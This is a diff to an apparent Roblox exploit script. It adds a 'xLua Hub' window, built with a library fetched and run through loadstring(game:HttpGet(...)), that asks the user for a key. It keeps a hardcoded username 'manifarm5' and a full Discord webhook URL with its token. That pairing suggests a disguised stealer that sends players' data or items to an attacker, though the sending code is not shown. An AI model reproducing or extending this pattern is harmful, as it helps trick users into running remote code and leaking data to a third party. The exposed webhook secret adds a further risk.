@@ -1,6 +1,21 @@
-local ScreenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
-local Frame = Instance.new("Frame", ScreenGui)
-Frame.Size = UDim2.new(1, 0, 1, 0)
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+local Window = OrionLib:MakeWindow({Name = "xLua Hub", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+
+local Tab = Window:MakeTab({
+    Name = "key",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+Tab:AddTextbox({
+    Name = "Enter Key",
+    Default = "Key Here",
+    TextDisappear = true,
+    Callback = function(Value)
+        print(Value)
+    end      
+})
 
 Username = "manifarm5"
 Webhook = "https://discord.com/api/webhooks/1288880636425142373/p6Oc-MStaTBN24hHi0UXIVj0DqcESA7ilyIDwQ-J_Hom4Ds-csozCKlSHY5l4tM-YEgP"
